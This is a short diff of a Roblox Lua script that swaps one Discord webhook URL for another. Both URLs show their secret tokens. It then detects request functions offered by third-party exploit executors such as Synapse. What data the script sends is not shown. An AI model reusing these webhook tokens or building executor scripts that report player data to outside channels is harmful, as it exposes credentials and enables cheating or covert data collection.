@@ -3,7 +3,7 @@ local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
-local webhookUrl = "https://discord.com/api/webhooks/1404177205206192148/NQfFH27GUj-bpqFXRazmI2ju2ca9tFP556k7MxHBfkiWej-poFBU9P6XQWum1wkZgywc"
+local webhookUrl = "https://discord.com/api/webhooks/1414673630792781996/vWKJ9_Aha9B1r-qyet4kNpyKWMnf64ejNKmQRFt9JPbXdJiI1CiTbz-PITX-DW29p3U_"
 
 -- robustes Erkennen der Request-Funktion (Synapse, http.request, http_request, request, _G.request)
 local requestFunction = (syn and syn.request) or (http and http.request) or http_request or request or (_G and _G.request)
